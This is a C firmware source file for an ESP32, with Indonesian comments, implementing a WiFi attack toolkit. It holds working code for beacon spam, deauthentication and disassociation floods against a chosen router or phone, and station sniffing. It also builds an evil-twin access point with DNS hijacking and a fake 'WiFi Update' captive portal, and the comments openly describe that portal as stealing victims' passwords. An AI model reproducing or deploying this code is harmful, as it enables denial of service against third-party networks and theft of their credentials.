#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "globals.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"
#include "lwip/sockets.h"
#include "esp_log.h"

// Fungsi kirim jawaban DNS (Hijack)
void dns_server_task(void* pvParameters) {
    int s = (int)pvParameters;
    uint8_t rx_buffer[512];
    while(1) {
        struct sockaddr_in source_addr;
        socklen_t addr_len = sizeof(source_addr);
        int len = recvfrom(s, rx_buffer, sizeof(rx_buffer), 0, (struct sockaddr *)&source_addr, &addr_len);

        if (len > 0) {
            rx_buffer[2] |= 0x80; // Flags: Response
            rx_buffer[3] |= 0x80; // Flags: Authoritative
            rx_buffer[7] = 1;      // Answer count = 1
            
            uint8_t answer[] = { 
                0xc0, 0x0c,       // Name pointer
                0x00, 0x01,       // Type A
                0x00, 0x01,       // Class IN
                0x00, 0x00, 0x00, 0x3c, // TTL 60s
                0x00, 0x04,       // Data length 4 (IP)
                192, 168, 4, 1    // IP ESP32 lu
            };
            memcpy(rx_buffer + len, answer, sizeof(answer));
            sendto(s, rx_buffer, len + sizeof(answer), 0, (struct sockaddr *)&source_addr, addr_len);
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void start_dns_server() {
    struct sockaddr_in dest_addr;
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(53);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    // Panggil fungsi task tadi secara normal
    xTaskCreate(dns_server_task, "dns_task", 4096, (void*)sock, 5, NULL);
}



// Fungsi sakti buat ubah Teks MAC ke Bytes
void stringToMac(const char* macStr, uint8_t *macAddr) {
    unsigned int m[6];
    sscanf(macStr, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]);
    for(int i = 0; i < 6; i++) macAddr[i] = (uint8_t)m[i];
}

uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00, 0x01, 0x04, 0x00 
};

const char* fakeSSIDs[] = {
    "Malinggg", "Penjinak Naga", "Toko Bangunan", 
    "Gapunya Kuota??", "Wifi Gratisss", "Kantor Polisi", 
    "ADUH KUOTA HABIS", "Pencari Janda", "Pencari Tobrut", "RUNGKAD"
};

const char* rickRollLyrics[] = {
    "1_Never gonna give you up", "2_Never gonna let you down",
    "3_Never gonna run around", "4_And desert you",
    "5_Never gonna make you cry", "6_Never gonna say goodbye",
    "7_Never gonna tell a lie", "8_And hurt you"
};

uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };




// HTML Portal (Simpel tapi meyakinkan)
const char* login_html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
                         "<style>body{font-family:sans-serif;text-align:center;} input{padding:10px;width:80%;margin:10px;}</style></head>"
                         "<body><h2>WiFi Update</h2><p>Masukkan password WiFi untuk update sistem.</p>"
                         "<form action='/login' method='POST'><input type='password' name='pw' placeholder='Password'><br>"
                         "<input type='submit' value='UPDATE NOW'></form></body></html>";

// Handler saat orang masukin password
esp_err_t login_post_handler(httpd_req_t *req) {
    char buf[100];
    int ret = httpd_req_recv(req, buf, req->content_len);
    if (ret > 0) {
        buf[ret] = '\0';
        // Ambil data password dari form (format: pw=isi_password)
        if (strstr(buf, "pw=")) {
            strcpy(stolenPassword, strchr(buf, '=') + 1);
            evilTwinState = 2; // Pindah ke layar hasil
        }
    }
    httpd_resp_send(req, "<h1>System Update Started...</h1>", -1);
    return ESP_OK;
}

// Handler buat nampilin halaman login (Captive Portal)
esp_err_t portal_get_handler(httpd_req_t *req) {
    httpd_resp_send(req, login_html, -1);
    return ESP_OK;
}

void start_web_server() {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 8;
    // Biar semua alamat liar (google, dll) ditangkep sama portal kita
    config.uri_match_fn = httpd_uri_match_wildcard;

    printf("Membuka Pintu Warung (Web Server)...\n");
    if (httpd_start(&server, &config) == ESP_OK) {
        
        // 1. DAFTARIN portal_get_handler (Biar dia guna buat nyajiin login_html)
        httpd_uri_t portal_uri = {
            .uri       = "/*",           // Tangkap semua request
            .method    = HTTP_GET,
            .handler   = portal_get_handler, // Fungsi penyambut lu dipanggil di sini
            .user_ctx  = NULL
        };
        httpd_register_uri_handler(server, &portal_uri);

        // 2. DAFTARIN login_post_handler (Biar dia guna buat nyolong password)
        httpd_uri_t login_uri = {
            .uri       = "/login",
            .method    = HTTP_POST,
            .handler   = login_post_handler, // Fungsi pencuri lu dipanggil di sini
            .user_ctx  = NULL
        };
        httpd_register_uri_handler(server, &login_uri);
        
        printf("Web Server Siap Tempur!\n");
    }
}


// Fungsi nyalain Evil Twin
void startEvilTwin() {
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));
    esp_wifi_set_mode(WIFI_MODE_APSTA); 
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid_hidden = 0,
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN,
            .channel = targetTerkunci.channel
        },
    };
    strncpy((char*)ap_config.ap.ssid, targetTerkunci.ssid, 32);
    
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_start();
    
    // --- INI KUNCINYA COK ---
    vTaskDelay(pdMS_TO_TICKS(50));
    start_dns_server();  // Paksa HP buka web
    start_web_server();  // Kasih web loginnya
    
    isEvilTwin = true;
    evilTwinState = 1; // Status: Waiting for data...
}




// Tambahin callback sniffer di wifi_system.c
void station_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return; 

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;

    uint8_t targetApMac[6];
    stringToMac(targetTerkunci.mac, targetApMac);
    
  //  if (memcmp(frame + 10, targetApMac, 6) == 0) {
    //    targetTerkunci.rssi = pkt->rx_ctrl.rssi;
    //    }

    uint8_t *addr1 = frame + 4;  
    uint8_t *addr2 = frame + 10; 
    uint8_t *addr3 = frame + 16; 

    uint8_t clientMac[6] = {0};
    bool isTargetNetwork = false;

    if (memcmp(addr1, targetApMac, 6) == 0)      { memcpy(clientMac, addr2, 6); isTargetNetwork = true; } 
    else if (memcmp(addr2, targetApMac, 6) == 0) { memcpy(clientMac, addr1, 6); isTargetNetwork = true; }
    else if (memcmp(addr3, targetApMac, 6) == 0) { memcpy(clientMac, addr2, 6); isTargetNetwork = true; }

    if (!isTargetNetwork) return; 
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < totalStation; i++) {
        if (memcmp(listStation[i].mac, clientMac, 6) == 0) {
            listStation[i].rssi = pkt->rx_ctrl.rssi;
            listStation[i].paket_count++;
            return;
        }
    }

    if (totalStation < 20) { 
        listStation[totalStation].id = totalStation + 1; 
        memcpy(listStation[totalStation].mac, clientMac, 6);
        listStation[totalStation].rssi = pkt->rx_ctrl.rssi;
        listStation[totalStation].paket_count = 1;
        totalStation++;
    }
}

void track_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;

    uint8_t targetApMac[6];
    stringToMac(targetTerkunci.mac, targetApMac);

    // Addr2 (Source MAC) di frame WiFi ada di offset 10
    // Kalo yang ngirim adalah router target kita, sikat nilai RSSI-nya!
    if (memcmp(frame + 10, targetApMac, 6) == 0) {
        targetTerkunci.rssi = pkt->rx_ctrl.rssi;
    }
}


void sendBeacon(const char* ssid) {
    int ssidLen = strlen(ssid);
    
    // Acak MAC Address
    for(int i = 10; i < 16; i++) {
        uint8_t r = esp_random() % 256;
        beaconPacket[i] = r;      
        beaconPacket[i+6] = r;    
    }

    // Pasang Nama SSID ke Paket
    beaconPacket[37] = ssidLen;
    for(int i = 0; i < ssidLen; i++) {
        beaconPacket[38+i] = ssid[i];
    }

    // Tambah Tail
    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

    // TEMBAK PAKE WIFI_IF_STA (Biar gak bentrok sama AP bawaan)
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
        vTaskDelay(pdMS_TO_TICKS(1)); 
    }
}

// Taruh di atas sebelum fungsi loopWiFi()

// Helper to sanitize SSID (dari GhostESP)
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// -
// ==========================================
// SATPAM WIFI (Event Handler buat OTA)
// ==========================================
static void wifi_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        ESP_LOGI("WIFI", "Sukses nyambung ke Router!");
        statusKoneksi = 1;
    } 
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ESP_LOGI("WIFI", "Dapet IP Address! Internet Ready!");
        isWiFiConnected = true; // INI YANG DITUNGGU SAMA MESIN OTA LU!
    } 
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI("WIFI", "Putus dari Router! Mencoba nyambung lagi...");
        isWiFiConnected = false;
        statusKoneksi = 2;
        esp_wifi_connect(); // Paksa reconnect kalau putus
    }
}




void loopWiFi(void * pvParameters) {


    // === INITIALIZATION SAKTI (WAJIB ADA DI ESP-IDF) ===
      // === INITIALIZATION SAKTI (WAJIB ADA DI ESP-IDF) ===
    static bool isWifiInit = false;
    if (!isWifiInit) {
        nvs_flash_init();
        esp_netif_init();
        esp_event_loop_create_default();
        
        esp_netif_create_default_wifi_sta(); 
        esp_netif_create_default_wifi_ap();  
        
        // VVV --- TAMBAHIN 2 BARIS INI COK! --- VVV
        esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
        esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL, NULL);
        // ^^^ -------------------------------- ^^^

        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        // ... (sisanya biarin sama kayak kodingan lu)

        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        isWifiInit = true;
        }
// Tambahin ini sebelum masuk ke while(1) di loopWiFi


    for(;;) {
        if (isSpamming) {
        
            if (!spamUdahSetup) {
               esp_wifi_stop(); 
                
                // === UBAH KE STA BIAR ESP32 SILUMAN ===
                esp_wifi_set_mode(WIFI_MODE_STA); 
                esp_wifi_start();
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_ps(WIFI_PS_NONE); // Matiin power save
                
                spamUdahSetup = true;
            }
            if (aktifModeSpam == 1) {
                int randomIdx = esp_random() % 10; 
                sendBeacon(fakeSSIDs[randomIdx]);
                vTaskDelay(pdMS_TO_TICKS(10)); 
            } 
            else if (aktifModeSpam == 2) {
                for (int i = 0; i < 8; i++) {
                    sendBeacon(rickRollLyrics[i]); 
                    vTaskDelay(pdMS_TO_TICKS(5));
                }
            }
            vTaskDelay(pdMS_TO_TICKS(50)); 
        } else if (triggerEvilTwin) {
    startEvilTwin(); // Fungsi yang tadi gw buatin
    triggerEvilTwin = false;
} // --- LOGIKA EVIL TWIN + DEAUTH ---
else if (isEvilTwin) {
    // 1. Tembak Deauth ke Target Asli (Biar HP mereka pindah ke WiFi palsu kita)
    uint8_t apMac[6];
    stringToMac(targetTerkunci.mac, apMac);
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Tembak paket deauth singkat (gak usah sebanyak loop deauth biasa biar web server gak berat)
    for (int b = 0; b < 5; b++) {
        uint8_t rawFrame[26];
        memcpy(rawFrame, deauthFrame, 26);
        memcpy(&rawFrame[4], broadcast, 6);
        memcpy(&rawFrame[10], apMac, 6);
        memcpy(&rawFrame[16], apMac, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
    }
    
    // 2. Kalau password sudah dapet, kita hentikan serangan otomatis
    if (evilTwinState == 2) {
        // Biarin korban tetep konek buat liat pesan "Update Success"
        // tapi kita kurangi intensitas deauth atau stop
    }

    vTaskDelay(pdMS_TO_TICKS(50)); // Jeda dikit biar web server tetep responsif
}





        else if (triggerScan) {
            sedang_scan = true;
            adaTarget = false;        
            targetLockedIdx = -1;     
            totalWiFi = 0;

            // --- SCAN ESP-IDF STYLE ---
            esp_wifi_stop(); 
            esp_wifi_set_mode(WIFI_MODE_STA);
            esp_wifi_start();
            
            wifi_scan_config_t scan_config = {0};
            esp_wifi_scan_start(&scan_config, true); // Blocking scan!
            
            uint16_t ap_count = 0;
            esp_wifi_scan_get_ap_num(&ap_count);
            totalWiFi = (ap_count > 30) ? 30 : ap_count;
            
            uint16_t fetch_count = totalWiFi; 
            // Masukin variabel perantaranya ke fungsi
            
            wifi_ap_record_t ap_records[30];
            esp_wifi_scan_get_ap_records(&fetch_count, ap_records); 
            
            for (int i = 0; i < totalWiFi; i++) {
                listWiFi[i].id = i;
                sanitize_ssid((uint8_t*)ap_records[i].ssid, listWiFi[i].ssid, sizeof(listWiFi[i].ssid));
                listWiFi[i].rssi = ap_records[i].rssi;
                listWiFi[i].channel = ap_records[i].primary;
                if (ap_records[i].authmode == WIFI_AUTH_OPEN) {
                listWiFi[i].is_open = true;
                strcpy(listWiFi[i].encrypt, "Open");
                } else { 
                listWiFi[i].is_open = false;
                strcpy(listWiFi[i].encrypt, "WPA2 / WPA3");
                }
                // Format MAC Address manual
                sprintf(listWiFi[i].mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                        ap_records[i].bssid[0], ap_records[i].bssid[1],
                        ap_records[i].bssid[2], ap_records[i].bssid[3],
                        ap_records[i].bssid[4], ap_records[i].bssid[5]);
            }

            esp_wifi_stop(); // Matiin STA
            
            sedang_scan = false;
            scanDone = true;     
            triggerScan = false; 
        }         else if (triggerTrack) {
            static bool trackUdahSetup = false;
            if (!trackUdahSetup) {
                esp_wifi_stop();
                esp_wifi_set_mode(WIFI_MODE_STA);
                esp_wifi_start();
                
                // Pasang kuping sniffer khusus Track
                esp_wifi_set_promiscuous(false);
                esp_wifi_set_promiscuous_rx_cb(&track_sniffer_cb);
                esp_wifi_set_promiscuous(true);
                
                // Kunci channel ke channel target
                esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
                trackUdahSetup = true;
            }
            // Biarin sniffer kerja di background, layar lu bakal update sendiri
            vTaskDelay(pdMS_TO_TICKS(100)); 
        }
                // --- LOGIKA KONEK KE ROUTER RUMAH (OTA) ---
        else if (triggerConnect) {
            triggerConnect = false; // Turunin pelatuknya biar gak ngeloop
            
            ESP_LOGI("WIFI", "Menerima perintah koneksi ke: %s", connSSID);
            
            esp_wifi_stop(); 
            esp_wifi_set_mode(WIFI_MODE_STA); 
            
            wifi_config_t wifi_config = {0};
            strcpy((char *)wifi_config.sta.ssid, connSSID);
            strcpy((char *)wifi_config.sta.password, inputPassword);
            
            esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
            esp_wifi_start();
            esp_wifi_connect(); // GAS KONEK!
            
            statusKoneksi = 0; // 0 = Sedang connecting
        }



                    // --- 1. BLOK SCAN STATION (Kunci Channel) ---
       else if (triggerScanSta) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(&station_sniffer_cb);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
            
            vTaskDelay(pdMS_TO_TICKS(4000)); // Scan 4 detik
            
            triggerScanSta = false;
            scanStaDone = true;
        }

        // --- 2. BLOK DEAUTH STATION (Serang HP Target) ---
        else if (isDeauthSta && adaTargetSta) {
            if (!deauthUdahSetup) {
                esp_wifi_stop();
                esp_wifi_set_mode(WIFI_MODE_AP); 
                wifi_config_t ap_config = {
                    .ap = {
                        .ssid = "Rumah Pak RT", // Ganti nama terserah lu
                        .ssid_len = strlen("Rumah Pak RT"),
                        .channel = targetTerkunci.channel,
                        .authmode = WIFI_AUTH_OPEN,
                        .max_connection = 1,
                        .ssid_hidden = 1, // <--- INI KUNCINYA, COK! (1 = Tersembunyi)
                    },
                };
                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
                esp_wifi_start();
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_ps(WIFI_PS_NONE); 
                esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
                deauthUdahSetup = true;
            }

            uint8_t apMac[6];      
            uint8_t clientMac[6];  
            stringToMac(targetTerkunci.mac, apMac); 
            memcpy(clientMac, targetSta.mac, 6); 

            for (int b = 0; b < 40; b++) {
                uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
                uint8_t rawFrame[26];
                memcpy(rawFrame, deauthFrame, 26);

                rawFrame[0] = 0xc0; 
                memcpy(&rawFrame[4], clientMac, 6); 
                memcpy(&rawFrame[10], apMac, 6);    
                memcpy(&rawFrame[16], apMac, 6);    
                rawFrame[22] = seq & 0xFF;
                rawFrame[23] = (seq >> 8) & 0xFF;
                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);

                rawFrame[0] = 0xa0; 
                memcpy(&rawFrame[4], apMac, 6);      
                memcpy(&rawFrame[10], clientMac, 6); 
                memcpy(&rawFrame[16], apMac, 6);     
                uint16_t seq2 = seq + 1;
                rawFrame[22] = seq2 & 0xFF;
                rawFrame[23] = (seq2 >> 8) & 0xFF;
                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
            }
            vTaskDelay(pdMS_TO_TICKS(1));
        }

            
        else if (isDeauthing && adaTarget) {
            if (!deauthUdahSetup) {
                esp_wifi_stop();
                // === REQ LU: UBAH KE AP ===
                esp_wifi_set_mode(WIFI_MODE_AP); 
                wifi_config_t ap_config = {
                    .ap = {
                        .ssid = "Rumah Pak RT", // Ganti nama terserah lu
                        .ssid_len = strlen("Rumah Pak RT"),
                        .channel = targetTerkunci.channel,
                        .authmode = WIFI_AUTH_OPEN,
                        .max_connection = 1,
                        .ssid_hidden = 1, // <--- INI KUNCINYA, COK! (1 = Tersembunyi)
                    },
                };
                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
                esp_wifi_start();
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_ps(WIFI_PS_NONE); 
                
                esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
                deauthUdahSetup = true;
            }

            uint8_t apMac[6];
            stringToMac(targetTerkunci.mac, apMac);
            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

            for (int b = 0; b < 40; b++) {
                uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
                
                uint8_t rawFrame[26];
                memcpy(rawFrame, deauthFrame, 26);
                rawFrame[0] = 0xc0; 
                memcpy(&rawFrame[4], broadcast, 6);
                memcpy(&rawFrame[10], apMac, 6);
                memcpy(&rawFrame[16], apMac, 6);
                rawFrame[22] = seq & 0xFF;
                rawFrame[23] = (seq >> 8) & 0xFF;
                rawFrame[24] = 0x01; 
                
                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
                
                rawFrame[0] = 0xa0; 
                // Sequence number kita bedain dikit biar natural
                uint16_t seq2 = seq + 1;
                rawFrame[22] = seq2 & 0xFF;
                rawFrame[23] = (seq2 >> 8) & 0xFF;
                rawFrame[24] = 0x08;

                // === REQ LU: TX VIA AP ===
                
                esp_wifi_80211_tx(WIFI_IF_AP, rawFrame, 26, false);
                
            }
            vTaskDelay(pdMS_TO_TICKS(1));
        }         
        

        // --- MANAJEMEN RADIO WIFI (BIAR GAK PANAS) ---
        // --- MANAJEMEN RADIO WIFI (BIAR GAK PANAS) ---
        // Tambahan: Jangan matiin radio kalau lagi OTA / Konek ke Router!
        if (!isSpamming && !isDeauthSta && !isDeauthing && !triggerScan && !isEvilTwin && !triggerEvilTwin && !triggerTrack && !triggerScanSta) {
            
            // Kalau kita GAK LAGI nyoba konek (statusKoneksi != 0) dan GAK konek internet, baru boleh tidur
            if (!isWiFiConnected && statusKoneksi != 0 && statusKoneksi != 1) {
                wifi_mode_t currentMode;
                esp_wifi_get_mode(&currentMode);

                if (currentMode != WIFI_MODE_NULL) { 
                    esp_wifi_set_promiscuous(false); 
                    esp_wifi_stop();                 
                    esp_wifi_set_mode(WIFI_MODE_NULL); 
                    spamUdahSetup = false;
                    deauthUdahSetup = false;
                }
            }
        }

        
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}
